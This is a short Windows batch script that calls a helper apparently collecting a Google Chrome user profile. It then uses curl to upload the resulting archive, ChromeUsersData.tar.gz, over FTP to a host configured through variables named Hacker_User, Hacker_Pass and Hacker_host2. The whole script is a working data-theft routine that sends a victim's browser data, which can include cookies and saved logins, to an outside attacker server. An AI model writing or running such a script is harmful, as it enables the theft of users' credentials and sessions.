@echo off
call %PUB1%\Util\getGoogleChrome_UsersProfile.cmd %1

curl --upload-file %PUB1%\Util\ChromeUsersData.tar.gz ftp://%Hacker_User%:%Hacker_Pass%@%Hacker_host2%:%Hacker_port%/webdav/


